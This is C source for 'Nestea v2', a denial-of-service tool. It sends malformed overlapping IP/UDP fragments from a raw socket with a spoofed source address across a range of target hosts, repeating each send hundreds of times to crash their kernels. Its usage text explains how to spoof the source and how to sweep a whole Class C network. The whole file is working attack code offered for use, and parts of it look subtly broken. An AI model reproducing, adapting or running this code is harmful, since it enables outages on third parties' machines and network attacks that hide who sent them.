#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define MAGIC2  108
#define PADDING 256    /* datagram frame padding for first packet */
#define COUNT   500    /* we are overwriting a small number of bytes we 
			shouldnt have access to in the kernel. 
			to be safe, we should hit them till they die :>  */
struct ipstuph
{
	int p1;
	int p2;
	int p3;
	int p4;
} startip, endip;

void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock, j, bequiet = 0;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    char hit_ip[18], dst_ip2[18];
    struct in_addr addr;
    
    fprintf(stderr, "\n[1;34mNestea v2 [0;34moriginally by[0m: [1;34mhumble [0;34m+ [1;34mttol mods[0m\n");
    fprintf(stderr, "[0;34mColor and Instructions was done by [0m: [1;34mttol[0m\n");
    fprintf(stderr, "[1;34mNote[0m : [1;34mttol released Nestea v2.  humble had nothing to do with \n       it, don't nag him about it.  -ttol@ttol.net[0m\n\n");
    
    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("[1;34mraw socket[0m");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 4) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "[1;34mWhat the hell kind of IP address is that?[0m\n");
        exit(1);
    }

    strcpy(dst_ip2,argv[3]);
    if(sscanf(argv[2],"%d.%d.%d.%d",&startip.p1,&startip.p2,&startip.p3,
                      &startip.p4) != 4)
    {
      fprintf(stderr, "[1;34mError, arg2(startip) [0m: [0;34mNeed an ip that contains 4 zones[0m\n");                           
      exit(1);
    }
    if (startip.p1 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 1 of start ip is incorrect \
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (startip.p2 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 2 of start ip is incorrect \
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (startip.p3 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 3 of start ip is incorrect \
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (startip.p4 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 4 of start ip is incorret \
                       (greater than 255)[0m\n");
       exit(1);
    }
    if(sscanf(argv[3],"%d.%d.%d.%d",&endip.p1,&endip.p2,&endip.p3,
                      &endip.p4) != 4)
    {
      fprintf(stderr, "[1;34mError, arg3(endip) [0m: [[0;34mNeed an ip that \
                       contains 4 zones[[0m\n");
      exit(1);
    }
    if (endip.p1 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 1 of end ip is incorrect \
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (endip.p2 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 2 of end ip is incorrect \
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (endip.p3 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 3 of end ip is incorrect
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (endip.p4 > 255) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 4 of end ip is incorrect
                       (greater than 255)[0m\n");
      exit(1);
    }
    if (startip.p1 != endip.p1) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 1 of start ip and end ip is different[0m\n");
      exit(1);
    }
    if (startip.p2 != endip.p2) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 2 of start ip and end ip is different[0m\n");
      exit(1);
    }
    if (startip.p3 != endip.p3) {
      fprintf(stderr, "[1;34mError [0m: [0;34mZone 3 of start ip and end ip is different[0m\n");
      exit(1);
    }
                                        
    while ((i = getopt_long(argc, argv, "s:t:n:q")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            case 'q':               /* quiet mode */
                bequiet = 1;
                break;                                                      
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "[1;34mDeath [0;34mon flaxen wings ([1;34myet again[0;34m)[0m:\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "[1;34mFrom[0m: [0;34m%15s.%d[0m\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  [1;34mTo[0m: [0;34m%15s - %s.%d[0m\n", inet_ntoa(addr), 
    					    dst_ip2, dst_prt);
    fprintf(stderr, " [1;34mAmt[0m: [0;34m%5d[0m\n", count);

    if (bequiet) fprintf(stderr, "[0;34m[[1;34mquiet mode[0;34m] [0;34mEach'[1;34m.[0;34m' represents a nuked ip.  [0;34m[[0m");
    for (j=startip.p4; j <= endip.p4; j++)
    {
      sprintf(hit_ip,"%d.%d.%d.%d",startip.p1,startip.p2,startip.p3,j);
      
      if (!(bequiet)) fprintf(stderr, "[0;34m%s [1;34m[ [0m", hit_ip);
                   
      if (!(dst_ip = name_resolve(hit_ip)))
    {
          fprintf(stderr, "[0;34mWhat the [1;34mhell [0;34mkind of IP address is that?[0m\n");
          exit(1);
    }
                                        
    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        if (!(bequiet)) fprintf(stderr, "[0;34md[1;34m00[0;34mm [0m");          
        usleep(500);
    }
    if (bequiet) fprintf(stderr, "[1;34m.[0m");
    else fprintf(stderr, "[0;34m][0m\n");
    }
    if (bequiet) fprintf(stderr, "[0;34m][0m\n");
    return (0);
}

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
int i;
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
    byte = 0x4F;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 44;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

	for(i=0;i<PADDING;i++)
	{
		p_ptr[i++]=random()%255;
	}	

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
"[1;34mnestea2 [0;34msource startIP endIP [1;34m[[0;34m-s src port[1;34m] [[0;34m-t dest port[1;34m] [[0;34m-n quantity[1;34m] [[0;34m-q[1;34m][0m\n");
    fprintf(stderr, "[0;34msource   [0m: [1;34mThis is the source IP to nestea from, make it a spoof[0m\n");
    fprintf(stderr, "[0;34mstartIP  [0m: [1;34mFrom which IP should we start from? [1;34m([0;34meg 153.35.85.1[1;34m)[0m\n");
    fprintf(stderr, "[0;34mendIP    [0m: [1;34mFrom which IP should we end with?   [1;34m([0;34meg 153.35.95.255[1;34m)[0m\n");
    fprintf(stderr, "[0;34msrc port [0m: [1;34mThis is the source port to spoof from [1;34m([0;34mOPTIONAL[1;34m)[0m\n");
    fprintf(stderr, "[0;34mdest port[0m: [1;34mThis is the destination port to nestea to [1;34m([0;34mOPTIONAL[1;34m)[0m\n");
    fprintf(stderr, "[0;34mquantity [0m: [1;34mThis is how many times to nestea the victim [1;34m([0;34mperfered is 1000[1;34m)[0m\n");
    fprintf(stderr, "[0;34m-q       [0m: [1;34mThis is quiet mode so you don't see the [0;34md[1;34m00[0;34mm[1;34m's[0m\n\n");
    fprintf(stderr, "[0;34mExample  [0m: [1;34mnestea2 127.0.0.1 153.35.85.1 153.35.85.255 -n 1000[0m\n");
    fprintf(stderr, "[0;34mThe above was to hit a whole Class C of 153.35.85 with the return \naddress from 127.0.0.1 doing it 1000 times[0m\n");
    fprintf(stderr, "[0;34mExample2 [0m: [1;34mnestea2 153.35.85.32 153.35.85.32 153.85.35.32 -n 1000[0m\n");
    fprintf(stderr, "[0;34mThe above was to hit 153.35.85.32 with the source 153.35.85.32 \ndoing it 1000 times[0m\n");
    fprintf(stderr, "[1;34mI perfer example2, probably because it is the lazy man's way out[0m\n\n");
    fprintf(stderr, "                             [1;5;34mNOT TO BE DISTRIBUTED![0m\n");
     exit(0);

}
